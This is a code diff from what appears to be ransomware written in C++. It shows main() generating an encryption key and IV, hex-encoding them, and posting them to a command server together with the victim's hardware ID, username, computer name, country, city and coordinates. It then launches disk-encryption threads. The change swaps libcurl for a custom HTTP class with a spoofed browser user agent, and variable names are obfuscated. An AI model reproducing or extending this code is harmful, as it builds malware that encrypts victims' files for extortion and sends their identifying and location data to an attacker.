@@ -9,11 +9,11 @@
 #include <cryptopp/filters.h>
 #include <cryptopp/hex.h>
 
-#include <curl/curl.h>
-
 #include "headers.h"
 #include "systeme.h"
 #include "diskEncryptor.h"
+#include "http.h"
+#include "toolkit.h"
 
 
 
@@ -52,27 +52,20 @@ int main(void) {
 	prng.GenerateBlock(key.data(), key.size());
 	prng.GenerateBlock(iv.data(), iv.size());
 
-
-	curl_global_init(CURL_GLOBAL_ALL);
-	CURL* curl = curl_easy_init();
-	if (curl) {
-		CURLcode res;
-		std::map<int, std::string> data = sys.getLocalization();
-		std::string ddzdzjd;
-		std::string dbhzgdzdgzm;
-		CryptoPP::StringSource(key.data(), key.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(ddzdzjd)));
-		CryptoPP::StringSource(iv.data(), iv.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(dbhzgdzdgzm)));
-		std::string query = "uuid=" + sys.getHwId() +"&username=" + sys.getUsername() +"&computername=" + sys.getComputerName() +"&langId=" + std::to_string(sys.getLangId()) +
-			"&country=" + data[0] +"&region=" + data[3] +"&city=" + data[1] +"&latlong=" + data[2] +"&osversion=" + std::to_string(sys.getOsVersion()) +
-			"&key=" + ddzdzjd +"&iv=" + dbhzgdzdgzm;
-		curl_easy_setopt(curl, CURLOPT_URL,"http://localhost/server/hdhohzuag.php?action=add");
-		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, query.c_str());
-		std::cout << query << std::endl;
-		res = curl_easy_perform(curl);
-		std::cout << res << std::endl;
-		return 0;
-	}
-	 	
+	std::map<int, std::string> data = sys.getLocalization();
+	std::string ddzdzjd;
+	std::string dbhzgdzdgzm;
+	CryptoPP::StringSource(key.data(), key.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(ddzdzjd)));
+	CryptoPP::StringSource(iv.data(), iv.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(dbhzgdzdgzm)));
+	std::string query = "uuid=" + sys.getHwId() + "&username=" + sys.getUsername() + "&computername=" + sys.getComputerName() + "&langId=" + std::to_string(sys.getLangId()) +
+		"&country=" + data[0] + "&region=" + data[3] + "&city=" + data[1] + "&latlong=" + data[2] + "&osversion=" + std::to_string(sys.getOsVersion()) +
+		"&key=" + ddzdzjd + "&iv=" + dbhzgdzdgzm;
+	std::cout << query << std::endl;
+	Http http(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
+	http.SendPostRequest(L"localhost", L"/server/hdhohzuag.php?action=add", L"Content-Type: application/x-www-form-urlencoded", to_wstring(query));
+	std::string response = http.GetResponseText();
+	std::cout << response << std::endl;
+	
 
 	std::vector<std::thread> threads;
 	std::vector<DiskEncryptor> toEncrypt;
